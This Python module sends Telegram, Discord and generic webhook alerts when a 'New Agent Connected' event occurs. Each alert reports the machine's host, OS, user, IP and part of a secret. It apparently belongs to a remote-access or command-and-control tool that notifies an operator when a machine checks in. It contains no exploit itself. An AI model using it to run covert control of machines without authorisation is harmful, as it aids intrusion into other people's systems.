"""
6319 Webhook Notifications
Telegram, Discord, Generic URL
"""

import os
import json
import urllib.request
import urllib.parse
from typing import Optional


class WebhookNotifier:
    """Send notifications to various webhook services"""
    
    def __init__(self):
        self.telegram_token = os.environ.get('TG_TOKEN')
        self.telegram_chat = os.environ.get('TG_CHATID')
        self.discord_webhook = os.environ.get('DISCORD_WEBHOOK')
        self.generic_webhook = os.environ.get('WEBHOOK_URL')
    
    def _post(self, url: str, data: dict, headers: dict = None) -> bool:
        """POST JSON data to URL"""
        try:
            if headers is None:
                headers = {'Content-Type': 'application/json'}
            
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode(),
                headers=headers,
                method='POST'
            )
            
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.status == 200
        except:
            return False
    
    def _get(self, url: str) -> bool:
        """GET request to URL"""
        try:
            with urllib.request.urlopen(url, timeout=10) as resp:
                return resp.status == 200
        except:
            return False
    
    def notify_telegram(self, message: str) -> bool:
        """Send Telegram notification"""
        if not self.telegram_token or not self.telegram_chat:
            return False
        
        url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
        data = {
            'chat_id': self.telegram_chat,
            'text': message,
            'parse_mode': 'HTML'
        }
        return self._post(url, data)
    
    def notify_discord(self, message: str, hostname: str = '') -> bool:
        """Send Discord notification"""
        if not self.discord_webhook:
            return False
        
        data = {
            'username': '6319',
            'content': message,
            'embeds': [{
                'title': 'New Agent Connected',
                'description': hostname,
                'color': 5814783
            }] if hostname else None
        }
        
        if not hostname:
            del data['embeds']
        
        return self._post(self.discord_webhook, data)
    
    def notify_generic(self, data: dict) -> bool:
        """Send to generic webhook URL"""
        if not self.generic_webhook:
            return False
        
        return self._post(self.generic_webhook, data)
    
    def notify_agent_connected(self, client_info: dict):
        """Notify all configured webhooks about new agent"""
        hostname = client_info.get('hostname', 'unknown')
        os_info = client_info.get('os', 'unknown')
        user = client_info.get('user', 'unknown')
        ip = client_info.get('ip', 'unknown')
        secret = client_info.get('secret', '')[:8]
        
        message = f"""<b>New Agent Connected</b>
Host: <code>{hostname}</code>
OS: <code>{os_info}</code>
User: <code>{user}</code>
IP: <code>{ip}</code>
Secret: <code>{secret}...</code>"""
        
        discord_msg = f"**New Agent Connected**\nHost: `{hostname}`\nOS: `{os_info}`\nUser: `{user}`\nIP: `{ip}`"
        
        results = []
        
        if self.telegram_token:
            results.append(('telegram', self.notify_telegram(message)))
        
        if self.discord_webhook:
            results.append(('discord', self.notify_discord(discord_msg, hostname)))
        
        if self.generic_webhook:
            results.append(('generic', self.notify_generic(client_info)))
        
        return results
    
    def is_configured(self) -> bool:
        """Check if any webhook is configured"""
        return bool(self.telegram_token or self.discord_webhook or self.generic_webhook)


def send_notification(client_info: dict) -> list:
    """Convenience function to send notification"""
    notifier = WebhookNotifier()
    return notifier.notify_agent_connected(client_info)
